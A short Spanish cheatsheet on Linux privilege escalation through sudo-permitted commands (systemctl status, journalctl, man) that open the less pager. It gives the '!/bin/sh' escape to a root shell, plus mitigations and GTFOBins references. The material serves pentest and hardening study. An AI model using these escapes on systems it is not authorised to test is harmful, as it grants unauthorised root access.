---
title: Privesc por pagers en Linux
description: Cheatsheet corto: escalar privilegios cuando sudo abre un pager (less) vía systemctl/journalctl.
tags:
  - linux
  - privesc
  - sudo
  - pager
  - less
  - systemctl
  - journalctl
  - gtfobins
sidebar_position: 20
---

# Privesc por pagers en Linux

Si `sudo` permite ejecutar un comando que abre un **pager interactivo** (normalmente `less`), puedes usar el escape `!` para ejecutar comandos con los privilegios del proceso (habitualmente **root**).

---

## 1. Checklist

1) Ver permisos:

```bash
sudo -l
````

2. Buscar comandos que suelen abrir pager:

* `systemctl status …`
* `journalctl …`
* `man …`
* cualquier cosa que use `$PAGER`

3. Ejecutar el comando con sudo y, dentro del pager (`less`), escapar:

```text
!/bin/sh
```

---

## 2. Casos típicos

### 2.1 `systemctl status` → less → root

```bash
sudo systemctl status &lt;servicio&gt;
```

En `less`:

```text
!/bin/sh
```

### 2.2 `journalctl` → less → root

```bash
sudo journalctl -u &lt;servicio&gt;
```

En `less`:

```text
!/bin/sh
```

> Si no abre pager: necesitas TTY y suficiente output (reduce el tamaño de terminal o usa un servicio con más salida).

---

## 4. Mitigación

* No permitir por sudo comandos que abran pagers interactivos.
* Evitar `NOPASSWD` salvo necesidad, y acotar argumentos.
* Forzar salida sin pager en comandos permitidos (`--no-pager` donde exista / políticas que neutralicen pagers).
* Revisar binarios permitidos contra GTFOBins.

---

## 5. Referencias

* [https://gtfobins.org/gtfobins/less/](https://gtfobins.org/gtfobins/less/)
* [https://gtfobins.org/gtfobins/systemctl/](https://gtfobins.org/gtfobins/systemctl/)
* [https://gtfobins.org/gtfobins/journalctl/](https://gtfobins.org/gtfobins/journalctl/)
